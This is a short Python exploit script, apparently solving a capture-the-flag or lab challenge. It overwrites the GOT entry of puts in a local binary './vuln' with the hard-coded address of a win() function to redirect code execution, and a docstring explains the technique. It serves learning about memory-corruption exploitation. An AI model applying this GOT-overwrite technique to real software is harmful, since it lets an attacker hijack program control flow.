import struct
import os

"""
The goal is to redirect code execution to the win() function
To do this, we can overwrite the GOT entry of a libc function which is called (in this case, it's puts) with the target function (win)
"""

arg1 = "AAAABBBBCCCCDDDD"
arg1 = struct.pack("I", 0x804c01c) # puts@GOT
arg2 = struct.pack("I", 0x8049216) # win function
command = "./vuln "+arg1+" "+arg2
os.system(command)

